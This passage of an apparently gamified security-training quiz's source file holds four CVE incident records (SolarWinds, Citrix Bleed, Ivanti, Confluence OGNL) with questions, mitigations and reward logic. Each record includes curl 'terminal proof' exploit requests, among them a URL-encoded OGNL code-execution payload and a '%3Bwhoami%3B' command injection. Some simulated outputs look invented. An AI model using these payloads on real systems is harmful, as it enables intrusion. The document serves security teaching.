    id: 'breach_solarwinds',
    dayIndex: 13,
    title: 'SolarWinds Orion API Authentication Bypass',
    cveId: 'CVE-2020-10148',
    threatActor: 'Nobelium / APT29 (Russian Foreign Intelligence Service)',
    targetArchitecture: 'SolarWinds Orion Platform Web Services',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.8,
    scenario: 'The SolarWinds Orion API contains an authentication bypass in its HTTP request filter. If a requested URI contains `.i18n.ashx`, the filter treats the request as a static localization resource and bypasses authentication completely.',
    codeLanguage: 'csharp',
    vulnerableLineNumber: 2,
    vulnerableCodeSnippet: `// SolarWinds Orion HttpModule request filter
1: bool IsStaticResource(string path) {
2:   // Vulnerable check: Contains() check on localization file extension
3:   if (path.IndexOf(".i18n.ashx", StringComparison.OrdinalIgnoreCase) >= 0) {
4:     return true; // Skips authentication for ANY request containing this substring!
5:   }
6:   return false;
7: }`,
    prompt: 'What flaw allowed unauthenticated remote attackers to query sensitive Orion API endpoints in CVE-2020-10148?',
    options: [
      {
        id: 'sw_1',
        text: 'The URL filter skipped authentication if the path contained strings like .i18n.ashx regardless of the remainder of the URI',
        isCorrect: true,
        mitigation: 'Enforce strict path-matching on static resource handlers rather than loose substring checks.'
      },
      {
        id: 'sw_2',
        text: 'Hardcoded backdoor credentials in the Orion database connection string',
        isCorrect: false,
        mitigation: 'This CVE is an HTTP API filter bypass, distinct from the SUNBURST DLL backdoor.'
      },
      {
        id: 'sw_3',
        text: 'SAML token signing certificate extraction via LDAP anonymous bind',
        isCorrect: false,
        mitigation: 'The issue is in ASP.NET HttpModule URL verification, not SAML signing.'
      },
      {
        id: 'sw_4',
        text: 'SQL injection in the Orion Network Performance Monitor dashboard',
        isCorrect: false,
        mitigation: 'The vulnerability is an authentication bypass in web routing, not SQL injection.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-287: Improper Authentication',
      attackVector: 'Attacker requests `/WebResource.axd?d=.../test.i18n.ashx/SWNetPerfMon.WebApi/v1/...` to execute unauthenticated API calls.',
      historicalImpact: 'Used by APT29 to execute remote API commands on Orion monitoring servers across Fortune 500 companies and government agencies.',
      remediationPatch: 'Replace substring `.Contains()` with exact route endpoint validation and upgrade to Orion Platform 2020.2.4.',
      terminalProof: '$ curl -k "https://orion.target.corp/SWNetPerfMon/logo.i18n.ashx/Orion/REST/GetUsers"\nHTTP/1.1 200 OK\n[{"Username":"admin","PasswordHash":"$2a$10$..."}]'
    },
    xpReward: 95,
    eloReward: 25
  },
  {
    id: 'breach_citrix_bleed',
    dayIndex: 14,
    title: 'Citrix Bleed: NetScaler Session Hijack Buffer Over-read',
    cveId: 'CVE-2023-4966',
    threatActor: 'Ransomware Affiliates & Cyber Extortion Groups',
    targetArchitecture: 'Citrix ADC and Citrix Gateway Appliances',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.4,
    scenario: 'Citrix ADC and Gateway contain an unauthenticated memory buffer over-read in the OpenID Connect endpoint. An attacker supplying a crafted Host header receives uninitialized memory containing valid 32-byte session tokens, bypassing MFA completely.',
    codeLanguage: 'c',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// Citrix NetScaler ns_oob_openid.c
1: char response_buffer[1024];
2: int len = snprintf(response_buffer, sizeof(response_buffer), "{\"issuer\": \"%s\" ...}", host_header);
3: // BUG: ns_send uses snprintf return value (length required) rather than actual bytes in buffer
4: ns_send(sock, response_buffer, len, 0); // Leaks adjacent heap memory containing auth cookies!`,
    prompt: 'How did attackers bypass multi-factor authentication (MFA) using Citrix Bleed?',
    options: [
      {
        id: 'cb_1',
        text: 'By dumping valid 32-byte session tokens from uninitialized gateway memory and replaying the NSC_AAAC cookie',
        isCorrect: true,
        mitigation: 'Upgrade to patched firmware and immediately terminate all active NetScaler AAA sessions via CLI.'
      },
      {
        id: 'cb_2',
        text: 'By cracking the RADIUS shared secret via GPU dictionary attack',
        isCorrect: false,
        mitigation: 'Citrix Bleed steals already-authenticated session tokens from memory without cracking RADIUS.'
      },
      {
        id: 'cb_3',
        text: 'By abusing a SAML assertion replay flaw due to missing timestamps',
        isCorrect: false,
        mitigation: 'The vulnerability is an OpenID endpoint buffer over-read, not a SAML replay issue.'
      },
      {
        id: 'cb_4',
        text: 'By forging JWT tokens with the alg:none header',
        isCorrect: false,
        mitigation: 'The exploit retrieves raw session tokens directly from memory; it does not forge JWTs.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer',
      attackVector: 'Attacker sends an HTTP GET request to `/oauth/idp/.well-known/openid-configuration` with a long Host header.',
      historicalImpact: 'Mass compromise of corporate and government VPN gateways worldwide, bypassing 2FA/MFA controls.',
      remediationPatch: 'Ensure `len = min(len, sizeof(response_buffer))` before calling socket transmission subroutines.',
      terminalProof: '$ curl -H "Host: aaaa...aaaa" https://vpn.target.com/oauth/idp/.well-known/openid-configuration\n[EXTRACTED] NSC_AAAC=a8f4c2e19b0d... [SESSION ACTIVE - MFA BYPASSED]'
    },
    xpReward: 90,
    eloReward: 25
  },
  {
    id: 'breach_ivanti_auth_bypass',
    dayIndex: 15,
    title: 'Ivanti Connect Secure Zero-Day Authentication Bypass',
    cveId: 'CVE-2023-46805',
    threatActor: 'State-Sponsored Espionage (UTA0178)',
    targetArchitecture: 'Ivanti Connect Secure (ICS) and Policy Secure Gateways',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.8,
    scenario: 'An authentication bypass in the Web reverse proxy component of Ivanti Connect Secure allows unauthenticated remote attackers to access restricted control plane API endpoints. Chained with CVE-2024-21887, attackers execute arbitrary root commands.',
    codeLanguage: 'python',
    vulnerableLineNumber: 2,
    vulnerableCodeSnippet: `// Ivanti ICS reverse proxy route configuration
1: location /api/v1/cav/client/configuration {
2:   # Missing authentication directive on /api/v1/cav paths!
3:   proxy_pass http://127.0.0.1:8000;
4: }
5: # Chained with command injection in license.py: os.system("tar -xf " + user_input)`,
    prompt: 'What allowed attackers to execute arbitrary system commands on Ivanti VPN devices?',
    options: [
      {
        id: 'iva_1',
        text: 'An authentication bypass in the /api/v1/cav endpoint chained with command injection in the license configuration handler',
        isCorrect: true,
        mitigation: 'Apply vendor XML mitigation to block /api/v1/cav and /api/v1/license paths and patch firmware.'
      },
      {
        id: 'iva_2',
        text: 'Stack overflow in the IKEv2 IPsec daemon',
        isCorrect: false,
        mitigation: 'The exploit operates over HTTP/HTTPS web management APIs, not IKEv2.'
      },
      {
        id: 'iva_3',
        text: 'Bypassing firewall rules using crafted IPv6 extension headers',
        isCorrect: false,
        mitigation: 'The vulnerability is application-layer API misconfiguration, not network packet encapsulation.'
      },
      {
        id: 'iva_4',
        text: 'XSS injection in the VPN user login portal form',
        isCorrect: false,
        mitigation: 'The flaw is backend authentication bypass and root command execution, not client-side XSS.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-77: Improper Neutralization of Special Elements used in a Command (Command Injection)',
      attackVector: 'Unauthenticated POST to `/api/v1/cav/client/configuration` chained to `/api/v1/license/keys-status/;{command};`.',
      historicalImpact: 'Compromised thousands of enterprise VPN concentrators, installing custom rootkits and dropping webshells.',
      remediationPatch: 'Import the vendor-supplied `mitigation.release.20240107.1.xml` file into the ICS admin portal.',
      terminalProof: '$ curl -k -X POST "https://gateway/api/v1/totp/user-backup-code/../../license/keys-status/%3Bwhoami%3B"\n{"result": "root"}'
    },
    xpReward: 95,
    eloReward: 25
  },
  {
    id: 'breach_atlassian_ognl',
    dayIndex: 16,
    title: 'Atlassian Confluence Server OGNL Expression Injection',
    cveId: 'CVE-2022-26134',
    threatActor: 'Mass Internet Weaponization & Cryptominers',
    targetArchitecture: 'Atlassian Confluence Server & Data Center',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.8,
    scenario: 'An OGNL expression injection in Confluence allows an unauthenticated remote attacker to execute arbitrary Java code on the server. The WebWork action mapper parses incoming request URIs and evaluates OGNL expressions embedded in the path.',
    codeLanguage: 'java',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// Confluence WebWork Action Mapper URI handler
1: String uri = request.getRequestURI();
2: String actionName = uri.substring(slashIndex + 1);
3: // OGNL evaluation executes Java code embedded directly in the URL!
4: OgnlValueStack stack = (OgnlValueStack) ActionContext.getContext().getValueStack();
5: Object result = stack.findValue(actionName);`,
    prompt: 'How did Confluence allow unauthenticated RCE through simple GET requests?',
    options: [
      {
        id: 'atl_1',
        text: 'The WebWork framework parsed HTTP URI segments as OGNL expressions, evaluating runtime Java execution code',
        isCorrect: true,
        mitigation: 'Upgrade Confluence to 7.18.0.1+ and sanitize URI path segments before passing to WebWork action mappers.'
      },
      {
        id: 'atl_2',
        text: 'Insecure direct object reference (IDOR) in Confluence page attachment download API',
        isCorrect: false,
        mitigation: 'The issue is server-side expression evaluation in routing, not object references.'
      },
      {
        id: 'atl_3',
        text: 'Arbitrary file upload in the Confluence avatar image crop tool',
        isCorrect: false,
        mitigation: 'The attack requires no file uploads; it is executed entirely within the request URI.'
      },
      {
        id: 'atl_4',
        text: 'Weak bcrypt password hashing in the internal user directory',
        isCorrect: false,
        mitigation: 'The vulnerability bypasses authentication altogether via expression injection.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement',
      attackVector: 'Attacker requests `/${@java.lang.Runtime@getRuntime().exec("id")}/` to trigger OGNL evaluation.',
      historicalImpact: 'Widespread automated exploitation deploying ransomware, Kinsing cryptominers, and webshells across enterprise wikis.',
      remediationPatch: 'Sanitize action mapper URIs and restrict OGNL context execution permissions.',
      terminalProof: '$ curl -v "http://confluence.corp:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%23hook%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29%29.%28%23hook.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/"\n< X-Cmd: uid=1000(confluence) gid=1000(confluence)'
    },
    xpReward: 90,
    eloReward: 25
  }
];

export interface DailyBreachTriageReward {
  baseXp: number;
  baseElo: number;
  speedBonusXp: number;
  isSpeedBonusEarned: boolean;
  classifiedDossierDiscovered: boolean;
  dossierBonusXp: number;
  totalXp: number;
  totalElo: number;
}

/**
 * Calculates controlled surprise rewards transparently.
 * Non-monetized, zero paywalls.
 * - Speed bonus (< 30s): +20 XP
 * - Classified ZeroDay Dossier (15% declared probability): +50 XP
 */
export function calculateBreachTriageRewards(
  incident: DailyBreachIncident,
  secondsTaken: number,
  isPro: boolean,
  randomSeed?: number
): DailyBreachTriageReward {
  const isSpeedBonusEarned = secondsTaken <= 30;
  const speedBonusXp = isSpeedBonusEarned ? 20 : 0;

  // 15% transparent probability of discovering a Classified Field Dossier
  const roll = randomSeed !== undefined ? randomSeed : Math.random();
  const classifiedDossierDiscovered = roll < 0.15;
  const dossierBonusXp = classifiedDossierDiscovered ? 50 : 0;

  const xpMultiplier = isPro ? 2 : 1;
  const totalXp = (incident.xpReward + speedBonusXp + dossierBonusXp) * xpMultiplier;
  const totalElo = incident.eloReward;

  return {
    baseXp: incident.xpReward,
    baseElo: incident.eloReward,
    speedBonusXp,
    isSpeedBonusEarned,
    classifiedDossierDiscovered,
    dossierBonusXp,
    totalXp,
    totalElo
  };
}

/**
 * Returns today's breach deterministically based on day of year.
 * Every user worldwide sees the exact same incident on the same day.
 */
export function getDailyBreachForDate(customDate?: string): DailyBreachIncident {
  const d = customDate ? new Date(customDate) : new Date();
  const startOfYear = new Date(d.getFullYear(), 0, 0);
  const diff = d.getTime() - startOfYear.getTime();
  const oneDay = 1000 * 60 * 60 * 24;
  const dayOfYear = Math.floor(diff / oneDay);

  const index = Math.abs(dayOfYear) % DAILY_BREACHES.length;
  return DAILY_BREACHES[index];
}

/**
 * Generates Wordle-style share text for social bragging & viral engagement.
 */
export function generateDailyBreachShareCard(
  incident: DailyBreachIncident,
  secondsTaken: number,
  isCorrect: boolean,
  currentStreak: number,
  userElo: number
): string {
  const dateStr = new Date().toISOString().slice(0, 10);
  const statusTag = isCorrect ? '[PASS]' : '[FAIL]';

  return `[ZeroDay] // Daily 0xBreach #${incident.dayIndex}
Date: ${dateStr} · ${incident.cveId}
${statusTag} Triage: ${isCorrect ? 'SUCCESS' : 'BREACH DETECTED'} (${secondsTaken.toFixed(1)}s)
Daily Incident Streak: ${currentStreak} days
Operational ELO: ${userElo}

Can you mitigate today's attack faster than me?
URL: https://zeroday.gg`;
}
